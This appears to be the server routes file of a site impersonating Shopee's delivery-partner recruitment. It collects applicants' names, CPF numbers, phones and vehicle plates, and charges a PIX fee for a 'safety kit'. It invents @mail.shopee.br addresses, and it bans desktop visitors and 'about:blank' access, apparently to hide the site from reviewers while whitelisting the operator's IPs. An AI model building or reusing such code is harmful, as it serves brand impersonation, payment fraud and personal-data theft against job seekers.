import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from 'ws';
import { storage } from "./storage";
import { paymentService } from "./payment";
import { createFor4Payment } from "./for4payments-bridge";
import { 
  insertCandidateSchema, 
  insertStateSchema, 
  insertBenefitSchema,
  insertUserSchema,
  insertBannedIpSchema
} from "@shared/schema";

// Tipagem para o cache global de pagamentos
declare global {
  var _paymentCache: {
    [id: string]: {
      id: string;
      pixCode: string;
      pixQrCode: string;
      name: string;
      cpf: string;
      email: string;
      timestamp: string;
      [key: string]: any;
    }
  } | undefined;
}
import axios from "axios";
import MobileDetect from "mobile-detect";

// Importar spawn do child_process para executar scripts Python
import { spawn } from 'child_process';

// Lista de IPs que nunca devem ser banidos automaticamente
// Estes IPs podem acessar o site mesmo de desktop sem serem banidos
const neverBanIPs = [
  "201.87.251.", // IP mencionado nos logs como banido incorretamente
  "201.87.251.220", // IP específico do cliente (sempre permitido)
  "191.247.4.",  // IP mencionado nos logs como banido incorretamente
  "127.0.0.1",   // Localhost
  "::1"          // Localhost IPv6
];

// Função auxiliar para obter o host do cliente de forma consistente
function getClientHost(req: Request): string {
  // Tentar obter do header origin primeiro
  let clientHost = req.headers.origin;
  
  // Se não tiver origin, tentar encontrar o referer
  if (!clientHost && req.headers.referer) {
    try {
      const refererUrl = new URL(req.headers.referer);
      clientHost = `${refererUrl.protocol}//${refererUrl.host}`;
    } catch (e) {
      console.log('[URL] Erro ao processar referer URL:', e);
    }
  }
  
  // Fallback para domínios conhecidos de produção
  if (!clientHost) {
    // Verificar se estamos em ambiente de produção
    if (process.env.NODE_ENV === 'production') {
      clientHost = 'https://shopee-entregador.netlify.app';
    } else {
      // Para desenvolvimento local, usar o endereço do servidor Replit
      const host = req.get('host') || '';
      clientHost = `${req.protocol}://${host}`;
    }
  }
  
  console.log(`[URL] Usando clientHost: ${clientHost}`);
  return clientHost;
}

// Função para obter localização de um IP usando o ipinfo.io (API gratuita sem necessidade de chave)
async function getIpLocation(ip: string): Promise<string> {
  try {
    // Use um serviço de mock para desenvolvimento local
    if (ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1" || ip.startsWith("::ffff:")) {
      return "Local Development";
    }
    
    // Remover qualquer prefixo IPv6 para IPv4 e limpar múltiplos IPs (em caso de proxy)
    let cleanIp = ip.replace(/^::ffff:/, '');
    
    // Se tivermos múltiplos IPs (comum em headers X-Forwarded-For), pegue apenas o primeiro
    if (cleanIp.includes(',')) {
      cleanIp = cleanIp.split(',')[0].trim();
    }
    
    // Para IPs privados ou localhost, não faça a chamada para API externa
    if (cleanIp === '127.0.0.1' || 
        cleanIp.startsWith('10.') || 
        cleanIp.startsWith('192.168.') || 
        cleanIp.startsWith('172.')) {
      return "IP Local/Privado";
    }
    
    // Usar a API ipinfo.io (não requer chave para uso básico)
    const response = await axios.get(`https://ipinfo.io/${cleanIp}/json`);
    
    if (response.data) {
      const locationData = response.data;
      if (locationData.city && locationData.country) {
        return `${locationData.city}, ${locationData.region || ''}, ${locationData.country}`;
      } else if (locationData.country) {
        return `${locationData.country}`;
      }
    }
    
    return "Localização não disponível";
  } catch (error) {
    console.error("Erro ao obter localização do IP:", error);
    return "Localização não disponível";
  }
}



interface VehicleInfo {
  MARCA?: string;
  MODELO?: string;
  SUBMODELO?: string;
  VERSAO?: string;
  ano?: string;
  anoModelo?: string;
  chassi?: string;
  codigoSituacao?: string;
  cor?: string;
  error?: string;
}

export async function registerRoutes(app: Express): Promise<Server> {
  // API para verificar se um IP está banido (permitir CORS)
  app.get('/api/check-ip-status', async (req: Request, res: Response) => {
    try {
      const ip = (req.headers["x-forwarded-for"] as string) || 
                 req.socket.remoteAddress || 
                 "unknown";
      
      // Verificar se o IP está na lista de exceções
      const ipBaseWithoutProxy = ip.split(',')[0].trim();
      const isWhitelisted = neverBanIPs.some(whitelistedIP => ipBaseWithoutProxy.includes(whitelistedIP));
      
      if (isWhitelisted) {
        return res.json({ 
          status: 'allowed', 
          message: 'IP na lista de exceções',
          ip
        });
      }
      
      // Verificar se o IP está banido no banco de dados
      const bannedIp = await storage.getBannedIp(ip);
      
      // Se o IP existe e está banido
      if (bannedIp && bannedIp.isBanned) {
        // Atualizar a data de última tentativa de acesso
        await storage.updateLastAccess(ip);
        
        return res.json({
          status: 'banned',
          message: 'IP banido no sistema',
          reason: bannedIp.reason || 'Tentativa de acesso não permitido',
          bannedAt: bannedIp.bannedAt,
          ip
        });
      }
      
      // Se o IP existe mas não está banido (foi desbloqueado)
      if (bannedIp && !bannedIp.isBanned) {
        return res.json({
          status: 'allowed',
          message: 'IP anteriormente banido, agora permitido',
          ip
        });
      }
      
      // IP não está banido
      return res.json({
        status: 'allowed',
        message: 'IP não banido',
        ip
      });
      
    } catch (error) {
      console.error('Erro ao verificar status do IP:', error);
      res.status(500).json({ 
        status: 'error', 
        message: 'Erro ao verificar status do IP',
        ip: req.ip
      });
    }
  });
  
  // API para verificar se um ID de dispositivo está banido
  app.get('/api/check-device/:deviceId', async (req: Request, res: Response) => {
    try {
      const { deviceId } = req.params;
      
      if (!deviceId) {
        return res.status(400).json({
          status: 'error',
          message: 'ID do dispositivo não fornecido'
        });
      }
      
      // Verificar no banco de dados
      const isBanned = await storage.isBannedByDeviceId(deviceId);
      
      return res.json({
        status: isBanned ? 'banned' : 'allowed',
        deviceId,
        message: isBanned ? 'Dispositivo banido' : 'Dispositivo permitido'
      });
      
    } catch (error) {
      console.error('Erro ao verificar status do dispositivo:', error);
      res.status(500).json({
        status: 'error',
        message: 'Erro ao verificar status do dispositivo' 
      });
    }
  });

  
  // Rota de healthcheck
  app.get('/health', (req, res) => {
    res.json({
      status: 'ok',
      env: process.env.NODE_ENV || 'development',
      version: '1.0.0',
      message: 'For4Payments API está operacional',
      timestamp: new Date().toISOString()
    });
  });
  
  // Novos endpoints para gerenciamento de IPs banidos
  
  // Verificar se o IP atual está banido
  app.get("/api/admin/check-ip-banned", async (req, res) => {
    try {
      const ip = req.ip || req.socket.remoteAddress || '0.0.0.0';
      const bannedIp = await storage.getBannedIp(ip);
      
      res.json({ 
        isBanned: !!bannedIp?.isBanned,
        ip: ip,
        bannedAt: bannedIp?.bannedAt 
      });
    } catch (error) {
      console.error("Erro ao verificar IP banido:", error);
      res.status(500).json({ error: "Erro ao verificar status do IP" });
    }
  });
  
  // Reportar acesso desktop para banir o IP permanentemente
  app.post("/api/admin/report-desktop-access", async (req, res) => {
    try {
      const ip = req.ip || req.socket.remoteAddress || '0.0.0.0';
      
      // Extrair dados do request body (nova versão envia mais detalhes)
      const { deviceId, userAgent: clientUserAgent, isAboutBlank, screen } = req.body;
      
      // Verificar se o IP já está na lista de exceções
      const ipBaseWithoutProxy = ip.split(',')[0].trim();
      if (neverBanIPs.some(whitelistedIP => ipBaseWithoutProxy.includes(whitelistedIP))) {
        console.log(`[PERMITIDO] IP ${ip} está na lista de exceções. Não será banido.`);
        return res.json({ 
          success: true, 
          message: "IP está na lista de exceções",
          ip: ip,
          isBanned: false
        });
      }
      
      // Se estiver usando about:blank, registramos explicitamente
      let reportReason = "Acesso via desktop detectado pelo frontend";
      if (isAboutBlank) {
        reportReason = "Tentativa de contornar bloqueio via about:blank";
        console.log(`[ALERTA] Tentativa de bypass via about:blank detectada no IP ${ip}`);
      }
      
      const userAgent = req.headers["user-agent"] || clientUserAgent || '';
      const referer = req.headers.referer || '';
      const origin = req.headers.origin || '';
      const location = await getIpLocation(ip);
      
      // Criar informação da tela quando disponível
      const screenSize = screen ? `${screen.width}x${screen.height}` : '';
      
      // Verificar se o IP já está registrado
      let bannedIp = await storage.getBannedIp(ip);
      
      // Se não existir, criar um novo registro com status banido
      if (!bannedIp) {
        bannedIp = await storage.createBannedIp({
          ip,
          isBanned: true,
          userAgent: userAgent || '',
          referer: referer || '',
          origin: origin || '',
          device: "Desktop (Frontend)",
          browserInfo: userAgent,
          screenSize: screenSize,
          platform: deviceId || '',  // Armazenar deviceId como identificador adicional
          language: req.headers["accept-language"] as string || '',
          reason: reportReason,
          location,
          accessUrl: req.originalUrl || req.url || '/'
        });
        console.log(`[BLOQUEIO] Novo IP banido via frontend: ${ip}${deviceId ? ' (DeviceID: ' + deviceId.substr(0, 10) + '...)' : ''}`);
      } 
      // Se já existir, mas não estiver banido, atualizar para banido
      else if (!bannedIp.isBanned) {
        bannedIp = await storage.updateBannedIpStatus(ip, true);
        console.log(`[BLOQUEIO] IP atualizado para banido via frontend: ${ip}`);
      }
      
      // Mesmo que já esteja banido, atualizamos o registro com o deviceId
      // para usar em verificações futuras de novos acessos
      broadcastToAll({
        type: 'new_banned_ip', 
        data: {
          ip,
          reason: reportReason,
          userAgent: userAgent || '',
          timestamp: new Date().toISOString()
        }
      });
      
      res.json({ 
        success: true, 
        message: "IP banido com sucesso",
        ip: ip,
        isBanned: true
      });
    } catch (error) {
      console.error("Erro ao banir IP:", error);
      res.status(500).json({ error: "Erro ao banir IP" });
    }
  });
  
  // Novo endpoint: Registrar deviceId para bloquear mesmo quando o IP mudar
  app.post("/api/admin/register-device", async (req, res) => {
    try {
      const { deviceId } = req.body;
      const ip = req.ip || req.socket.remoteAddress || '0.0.0.0';
      
      if (!deviceId) {
        return res.status(400).json({ error: "DeviceID não fornecido" });
      }
      
      // Verificar se o IP já está na lista de exceções
      const ipBaseWithoutProxy = ip.split(',')[0].trim();
      if (neverBanIPs.some(whitelistedIP => ipBaseWithoutProxy.includes(whitelistedIP))) {
        console.log(`[PERMITIDO] IP ${ip} com DeviceID ${deviceId.substr(0, 8)} está na lista de exceções.`);
        return res.json({ 
          success: true, 
          message: "IP está na lista de exceções",
          ip: ip,
          isBanned: false
        });
      }
      
      // Se o IP ainda não estiver na lista de banidos, vamos adicioná-lo
      let bannedIp = await storage.getBannedIp(ip);
      
      if (!bannedIp) {
        const userAgent = req.headers["user-agent"] || '';
        const referer = req.headers.referer || '';
        const origin = req.headers.origin || '';
        const location = await getIpLocation(ip);
        
        // Criar novo registro com o deviceId como identificador
        bannedIp = await storage.createBannedIp({
          ip,
          isBanned: true,
          userAgent: userAgent || '',
          referer: referer || '',
          origin: origin || '',
          device: "Mobile (Banned by DeviceID)",
          browserInfo: userAgent,
          screenSize: "",
          platform: deviceId,  // Usar platform para armazenar o deviceId
          language: req.headers["accept-language"] as string || '',
          reason: "Acesso de dispositivo previamente banido (deviceId)",
          location,
          accessUrl: req.originalUrl || req.url || '/'
        });
        
        console.log(`[BLOQUEIO] IP banido via DeviceID ${deviceId.substr(0, 8)}: ${ip}`);
        
        // Notificar o dashboard sobre o novo IP banido
        broadcastToAll({
          type: 'new_banned_ip', 
          data: {
            ip,
            reason: "Dispositivo previamente banido",
            userAgent: userAgent || '',
            timestamp: new Date().toISOString()
          }
        });
      }
      
      res.json({ 
        success: true, 
        message: "Dispositivo registrado com sucesso",
        ip: ip,
        isBanned: true
      });
    } catch (error) {
      console.error("Erro ao registrar dispositivo:", error);
      res.status(500).json({ error: "Erro ao registrar dispositivo" });
    }
  });
  
  // Rota proxy para For4Payments para evitar CORS
  app.post('/api/proxy/for4payments/pix', async (req, res) => {
    try {
      // Verificar se a API For4Payments está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.warn('FOR4PAYMENTS_SECRET_KEY não configurada - usando dados de demonstração');
        return res.status(200).json({
          id: `demo_${Date.now()}`,
          pixCode: '00020126580014BR.GOV.BCB.PIX01369f2b8d4b-1234-5678-9abc-def123456789520400005303986540517.005802BR5925Nome do Destinatario6009SAO PAULO62070503***6304',
          pixQrCode: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
          status: 'PENDING',
          message: 'Demonstração - configure FOR4PAYMENTS_SECRET_KEY para pagamentos reais'
        });
      }
      
      console.log('Iniciando proxy para For4Payments...');
      
      // Configurar cabeçalhos para a requisição à For4Payments
      const apiUrl = 'https://app.for4payments.com.br/api/v1/transaction.purchase';
      const secretKey = process.env.FOR4PAYMENTS_SECRET_KEY;
      
      // Processar os dados recebidos
      const { name, cpf, email, phone, amount = 84.70, description = "Kit de Segurança Shopee Delivery" } = req.body;
      
      if (!name || !cpf) {
        return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
      }
      
      // Processar CPF - remover caracteres não numéricos
      const cleanedCpf = cpf.replace(/[^0-9]/g, '');
      
      // Processar telefone - remover caracteres não numéricos 
      const cleanedPhone = phone ? phone.replace(/\D/g, '') : null;
      
      // Converter valor para centavos
      const amountInCents = Math.round(amount * 100);
      
      // Gerar email se não tiver sido fornecido
      const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
      
      // Construir payload para a For4Payments conforme formato esperado
      const payload = {
        name,
        email: userEmail,
        cpf: cleanedCpf,
        phone: cleanedPhone, // Telefone limpo, apenas números
        paymentMethod: "PIX",
        amount: amountInCents,
        items: [{
          title: description || "Kit de Segurança",
          quantity: 1,
          unitPrice: amountInCents,
          tangible: false
        }]
      };
      
      console.log('Enviando requisição para For4Payments API via proxy...', {
        name: payload.name,
        cpf: `${cleanedCpf.substring(0, 3)}***${cleanedCpf.substring(cleanedCpf.length - 2)}`
      });
      
      // Enviar requisição para For4Payments
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': secretKey, // A API espera apenas o token sem o prefixo 'Bearer'
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      // Processar resposta
      const result = await response.json();
      
      console.log('Resposta da For4Payments recebida pelo proxy');
      
      // Se a resposta foi bem-sucedida e temos os dados do PIX, enviar email
      if (response.status === 200 && result && result.pixCode && result.pixQrCode) {
        // Importar o serviço de email
        const { emailService } = await import('./email-service');
        
        // Formatar o valor para exibição
        const formattedAmount = new Intl.NumberFormat('en-US', {
          style: 'currency',
          currency: 'USD'
        }).format(amount);
        
        // Construir o link para a página de pagamento (se houver)
        // O frontend pode ter uma página específica para acompanhamento do pagamento
        const clientHost = getClientHost(req);
        const paymentLink = `${clientHost}/payment?id=${result.id}&email=${encodeURIComponent(userEmail)}`;
        
        // Enviar o email de confirmação
        try {
          const emailSent = await emailService.sendPaymentConfirmationEmail({
            email: userEmail,
            name,
            pixCode: result.pixCode,
            pixQrCode: result.pixQrCode,
            amount,
            formattedAmount,
            paymentLink
          });
          
          // Adicionar informação de email enviado à resposta
          result.emailSent = emailSent;
          
          if (emailSent) {
            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
          } else {
            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
          }
        } catch (emailError) {
          console.error('Erro ao enviar email de confirmação:', emailError);
          result.emailSent = false;
          result.emailError = 'Falha ao enviar email de confirmação';
        }
      }
      
      // Retornar resposta para o cliente
      return res.status(response.status).json(result);
    } catch (error: any) {
      console.error('Erro no proxy For4Payments:', error);
      return res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento pelo proxy'
      });
    }
  });
  // Rota para obter todos os estados
  app.get('/api/states', async (req, res) => {
    try {
      const states = await storage.getAllStates();
      res.json(states);
    } catch (error) {
      console.error('Erro ao buscar estados:', error);
      res.status(500).json({ error: 'Falha ao buscar estados' });
    }
  });

  // Rota para obter estados com vagas disponíveis
  app.get('/api/states/with-vacancies', async (req, res) => {
    try {
      const states = await storage.getStatesWithVacancies();
      res.json(states);
    } catch (error) {
      console.error('Erro ao buscar estados com vagas:', error);
      res.status(500).json({ error: 'Falha ao buscar estados com vagas' });
    }
  });

  // Manter a rota de regiões para retrocompatibilidade
  app.get('/api/regions', async (req, res) => {
    try {
      const states = await storage.getAllStates();
      
      // Mapear o formato antigo, agora usando o vacancyCount
      const regions = states.map(state => ({
        name: state.name,
        abbr: state.code,
        vacancies: state.vacancyCount
      }));
      
      res.json(regions);
    } catch (error) {
      console.error('Erro ao buscar regiões:', error);
      res.status(500).json({ error: 'Falha ao buscar regiões' });
    }
  });
  
  // Cache para evitar consultas duplicadas ao serviço externo
  const vehicleInfoCache: Record<string, any> = {};

  // Endpoint para consultar informações do veículo pela placa
  app.get('/api/vehicle-info/:placa', async (req: Request, res: Response) => {
    // Adicionar headers CORS específicos para permitir solicitações do Netlify
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Accept');
    
    // Responder imediatamente a requisições OPTIONS para CORS preflight
    if (req.method === 'OPTIONS') {
      return res.status(204).end();
    }
    
    try {
      const { placa } = req.params;
      
      if (!placa) {
        return res.status(400).json({ error: 'Placa do veículo não fornecida' });
      }
      
      // Limpar a placa e deixar apenas letras e números
      const vehiclePlate = placa.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
      
      // Verificar se a informação já está em cache no servidor
      if (vehicleInfoCache[vehiclePlate]) {
        console.log(`[CACHE-SERVER] Usando dados em cache para placa: ${vehiclePlate}`);
        return res.json(vehicleInfoCache[vehiclePlate]);
      }
      
      console.log(`[INFO] Consultando informações do veículo com placa: ${vehiclePlate}`);
      
      // Verificar se existe a chave da API de veículos
      if (!process.env.VEHICLE_API_KEY) {
        console.warn('[AVISO] API Key não disponível para consulta direta');
        // Return demo vehicle data for development
        const demoData = {
          MARCA: 'VOLKSWAGEN',
          MODELO: 'GOL',
          SUBMODELO: '1.0',
          VERSAO: 'CITY',
          ano: '2020',
          anoModelo: '2020',
          chassi: 'DEMO***CHASSI***123',
          codigoSituacao: '0',
          cor: 'BRANCA',
          placa: vehiclePlate
        };
        
        // Cache the demo data
        vehicleInfoCache[vehiclePlate] = demoData;
        
        return res.json(demoData);
      }

      // Para fins de debug e análise (primeiro 5 caracteres apenas)
      const keyPreview = process.env.VEHICLE_API_KEY.substring(0, 5) + '...' + 
                          process.env.VEHICLE_API_KEY.substring(process.env.VEHICLE_API_KEY.length - 3);
      console.log(`[DEBUG] API key presente: ${keyPreview}`);
      
      // Chave API para consulta direta (da variável de ambiente)
      const apiKey = process.env.VEHICLE_API_KEY;
      
      if (!apiKey) {
        console.error('[ERRO] Chave API de veículos não configurada nas variáveis de ambiente');
        return res.status(500).json({ 
          error: 'Serviço não configurado',
          details: 'Chave de API não configurada'
        });
      }
      
      // URL da API de consulta de veículos (formato correto com chave na URL)
      const apiUrl = `https://wdapi2.com.br/consulta/${vehiclePlate}/${apiKey}`;
      
      // Variável para armazenar os dados do veículo
      let vehicleData = null;
      let errorLogs = [];
      
      // Consulta com o formato correto de URL
      try {
        console.log('[DEBUG] Tentando consulta direta com chave na URL');
        
        const response = await fetch(apiUrl, {
          method: 'GET',
          headers: {
            'Accept': 'application/json'
          }
        });
        
        if (response.ok) {
          vehicleData = await response.json();
          console.log('[INFO] Consulta de veículo bem-sucedida');
        } else {
          const status = response.status;
          console.log('[AVISO] Consulta de veículo falhou:', status);
          errorLogs.push(`Consulta falhou: Status ${status}`);
        }
      } catch (error) {
        const errorMsg = error instanceof Error ? error.message : String(error);
        console.error('[ERRO] Falha na consulta de veículo:', errorMsg);
        errorLogs.push(`Erro na consulta: ${errorMsg}`);
      }
      
      // Verificar se a consulta falhou completamente
      if (!vehicleData) {
        console.error('[ERRO] Todas as tentativas falharam');
        
        // Em ambiente de desenvolvimento, fornecer dados de teste
        if (process.env.NODE_ENV === 'development') {
          console.log('[DEBUG] Fornecendo dados de veículo de teste para desenvolvimento');
          return res.json({
            marca: "Toyota (Teste)",
            modelo: "Corolla (Teste)",
            ano: "2023",
            anoModelo: "2023",
            chassi: "TESTE123456789",
            cor: "Prata",
            placa: vehiclePlate
          });
        }
        
        return res.status(500).json({ 
          error: 'Falha ao consultar dados do veículo',
          details: 'Todas as tentativas de consulta falharam. Verifique sua conexão ou a chave de API.',
          errorLogs,
          timestamp: new Date().toISOString()
        });
      }
      
      // Se a API retornou, mas com erro
      if (vehicleData.error) {
        console.log(`[INFO] Erro na consulta da placa ${vehiclePlate}: ${vehicleData.error}`);
        return res.status(404).json({ 
          error: vehicleData.error,
          placa: vehiclePlate,
          message: 'A API de veículos retornou um erro para esta placa.',
          timestamp: new Date().toISOString()
        });
      }
      
      // Criar objeto de resposta formatado
      const responseData = {
        MARCA: vehicleData.MARCA || vehicleData.marca || "Não informado",
        MODELO: vehicleData.MODELO || vehicleData.modelo || "Não informado",
        marca: vehicleData.MARCA || vehicleData.marca || "Não informado",
        modelo: vehicleData.MODELO || vehicleData.modelo || "Não informado",
        ano: vehicleData.ano || vehicleData.anoModelo || "Não informado",
        anoModelo: vehicleData.anoModelo || vehicleData.ano || "Não informado",
        chassi: vehicleData.chassi || "Não informado",
        cor: vehicleData.cor || "Não informado",
        placa: vehiclePlate
      };
      
      // Guardar no cache
      vehicleInfoCache[vehiclePlate] = responseData;
      console.log(`[CACHE-SERVER] Armazenando dados da placa ${vehiclePlate} em cache`);
      
      // Retornar os dados
      return res.json(responseData);
      
    } catch (error) {
      console.error('Erro ao consultar informações do veículo:', error);
      // Detalhes do erro para facilitar a depuração
      const errorMessage = error instanceof Error ? error.message : 'Erro desconhecido';
      res.status(500).json({ 
        error: 'Erro ao consultar informações do veículo',
        details: errorMessage,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Rota para criar ou atualizar um estado
  app.post('/api/states', async (req, res) => {
    try {
      const stateData = insertStateSchema.parse(req.body);
      const state = await storage.createState(stateData);
      res.status(201).json(state);
    } catch (error) {
      console.error('Erro ao criar estado:', error);
      res.status(400).json({ error: 'Dados inválidos para criar estado' });
    }
  });

  // Rota para obter todos os benefícios
  app.get('/api/benefits', async (req, res) => {
    try {
      const benefits = await storage.getAllBenefits();
      res.json(benefits);
    } catch (error) {
      console.error('Erro ao buscar benefícios:', error);
      res.status(500).json({ error: 'Falha ao buscar benefícios' });
    }
  });

  // Rota para criar um benefício
  app.post('/api/benefits', async (req, res) => {
    try {
      const benefitData = insertBenefitSchema.parse(req.body);
      const benefit = await storage.createBenefit(benefitData);
      res.status(201).json(benefit);
    } catch (error) {
      console.error('Erro ao criar benefício:', error);
      res.status(400).json({ error: 'Dados inválidos para criar benefício' });
    }
  });

  // Rota para criar um candidato (delivery partner)
  app.post('/api/candidates', async (req, res) => {
    try {
      const candidateData = insertCandidateSchema.parse(req.body);
      
      // Verificar se o email já está cadastrado
      const existingCandidate = await storage.getCandidateByEmail(candidateData.email);
      if (existingCandidate) {
        return res.status(409).json({ error: 'Email já cadastrado' });
      }
      
      // Verificar se o estado existe
      const state = await storage.getState(candidateData.state);
      if (!state) {
        return res.status(400).json({ error: 'Estado inválido' });
      }
      
      const candidate = await storage.createCandidate(candidateData);
      res.status(201).json(candidate);
    } catch (error) {
      console.error('Erro ao criar candidato:', error);
      res.status(400).json({ error: 'Dados inválidos para criar candidato' });
    }
  });

  // Rota para obter todos os candidatos
  app.get('/api/candidates', async (req, res) => {
    try {
      const candidates = await storage.getAllCandidates();
      res.json(candidates);
    } catch (error) {
      console.error('Erro ao buscar candidatos:', error);
      res.status(500).json({ error: 'Falha ao buscar candidatos' });
    }
  });

  // Rota principal para processar pagamentos
  app.post('/api/payments', async (req, res) => {
    try {
      // Verificar se a API For4Payments está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.warn('FOR4PAYMENTS_SECRET_KEY não configurada - usando dados de demonstração');
        return res.status(200).json({
          id: `demo_${Date.now()}`,
          pixCode: '00020126580014BR.GOV.BCB.PIX01369f2b8d4b-1234-5678-9abc-def123456789520400005303986540517.005802BR5925Nome do Destinatario6009SAO PAULO62070503***6304',
          pixQrCode: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
          status: 'PENDING',
          message: 'Demonstração - configure FOR4PAYMENTS_SECRET_KEY para pagamentos reais'
        });
      }

      console.log('Dados de pagamento recebidos:', req.body);
      
      // Validar dados da requisição
      const { name, email, cpf, phone, amount, items } = req.body;
      
      // Validação básica
      if (!name) {
        return res.status(400).json({ error: 'Nome é obrigatório.' });
      }
      
      if (!cpf) {
        return res.status(400).json({ error: 'CPF é obrigatório.' });
      }
      
      // Usar o valor fornecido ou o valor padrão
      const paymentAmount = amount || 7990;
      
      // Usar o email fornecido ou gerar um
      const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
      
      console.log(`Processando pagamento de R$ ${paymentAmount/100} para ${name}, CPF ${cpf}`);
      
      // Processar pagamento via For4Payments
      const paymentResult = await paymentService.createPixPayment({
        name,
        email: userEmail,
        cpf,
        phone: phone || '',
        amount: paymentAmount/100,
        items
      });
      
      console.log('Resultado do pagamento For4Payments:', paymentResult);
      
      // Se o pagamento foi processado com sucesso, enviar email
      if (paymentResult.pixCode && paymentResult.pixQrCode) {
        // Importar o serviço de email
        const { emailService } = await import('./email-service');
        
        // Formatar o valor para exibição
        const formattedAmount = new Intl.NumberFormat('en-US', {
          style: 'currency',
          currency: 'USD'
        }).format(paymentAmount/100);
        
        // Construir o link para a página de pagamento
        const clientHost = getClientHost(req);
        const paymentLink = `${clientHost}/payment?id=${paymentResult.id}&email=${encodeURIComponent(userEmail)}`;
        
        // Enviar o email de confirmação
        try {
          const emailSent = await emailService.sendPaymentConfirmationEmail({
            email: userEmail,
            name,
            pixCode: paymentResult.pixCode,
            pixQrCode: paymentResult.pixQrCode,
            amount: paymentAmount/100,
            formattedAmount,
            paymentLink
          });
          
          paymentResult.emailSent = emailSent;
          
          if (emailSent) {
            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
          } else {
            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
          }
        } catch (emailError) {
          console.error('Erro ao enviar email de confirmação:', emailError);
          paymentResult.emailSent = false;
          paymentResult.emailError = 'Falha ao enviar email de confirmação';
        }
      }
      
      // Retornar resultado para o frontend
      res.status(200).json(paymentResult);
    } catch (error: any) {
      console.error('Erro ao processar pagamento:', error);
      res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento.'
      });
    }
  });
  
  // Rota para processar pagamento PIX (usando TS API For4Payments)
  app.post('/api/payments/pix', async (req, res) => {
    try {
      // Verificar se a API For4Payments está configurada
      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
        console.warn('FOR4PAYMENTS_SECRET_KEY não configurada - usando dados de demonstração');
        return res.status(200).json({
          id: `demo_${Date.now()}`,
          pixCode: '00020126580014BR.GOV.BCB.PIX01369f2b8d4b-1234-5678-9abc-def123456789520400005303986540517.005802BR5925Nome do Destinatario6009SAO PAULO62070503***6304',
          pixQrCode: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
          status: 'PENDING',
          message: 'Demonstração - configure FOR4PAYMENTS_SECRET_KEY para pagamentos reais'
        });
      }

      console.log('Dados de pagamento recebidos:', req.body);
      
      // Validar dados da requisição
      const { name, email, cpf, phone } = req.body;
      
      // Validação básica
      if (!name) {
        return res.status(400).json({ error: 'Nome é obrigatório.' });
      }
      
      if (!cpf) {
        return res.status(400).json({ error: 'CPF é obrigatório.' });
      }
      
      // Valor fixo para o kit de segurança: R$ 64,90
      const paymentAmount = 79.90;
      
      // Usar o email fornecido ou gerar um
      const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
      
      console.log(`Processando pagamento de R$ ${paymentAmount} para ${name}, CPF ${cpf}`);
      
      // Processar pagamento via For4Payments
      const paymentResult = await paymentService.createPixPayment({
        name,
        email: userEmail,
        cpf,
        phone: phone || '',
        amount: paymentAmount
      });
      
      console.log('Resultado do pagamento For4Payments:', paymentResult);
      
      // Se o pagamento foi processado com sucesso, enviar email
      if (paymentResult.pixCode && paymentResult.pixQrCode) {
        // Importar o serviço de email
        const { emailService } = await import('./email-service');
        
        // Formatar o valor para exibição
        const formattedAmount = new Intl.NumberFormat('pt-BR', {
          style: 'currency',
          currency: 'BRL'
        }).format(paymentAmount);
        
        // Construir o link para a página de pagamento (se houver)
        const clientHost = getClientHost(req);
        const paymentLink = `${clientHost}/payment?id=${paymentResult.id}&email=${encodeURIComponent(userEmail)}`;
        console.log(`[EMAIL] Link de pagamento gerado: ${paymentLink}`);
        
        // Enviar o email de confirmação
        try {
          const emailSent = await emailService.sendPaymentConfirmationEmail({
            email: userEmail,
            name,
            pixCode: paymentResult.pixCode,
            pixQrCode: paymentResult.pixQrCode,
            amount: paymentAmount,
            formattedAmount,
            paymentLink
          });
          
          // Adicionar informação de email enviado à resposta
          paymentResult.emailSent = emailSent;
          
          if (emailSent) {
            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
          } else {
            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
          }
        } catch (emailError) {
          console.error('Erro ao enviar email de confirmação:', emailError);
          paymentResult.emailSent = false;
          paymentResult.emailError = 'Falha ao enviar email de confirmação';
        }
      }
      
      // Retornar resultado para o frontend
      res.status(200).json(paymentResult);
    } catch (error: any) {
      console.error('Erro ao processar pagamento PIX:', error);
      res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento PIX.'
      });
    }
  });
  
  // Rota para processar pagamento PIX
  // Rota para obter informações de pagamento específicas por ID
  app.get('/api/payments/:id', async (req, res) => {
    try {
      const { id } = req.params;
      
      if (!id) {
        return res.status(400).json({ error: 'ID de pagamento não fornecido' });
      }
      
      // Em uma implementação real, buscaríamos as informações no banco de dados
      // Neste caso, estamos usando a API For4Payments diretamente
      // para obter os dados da transação original
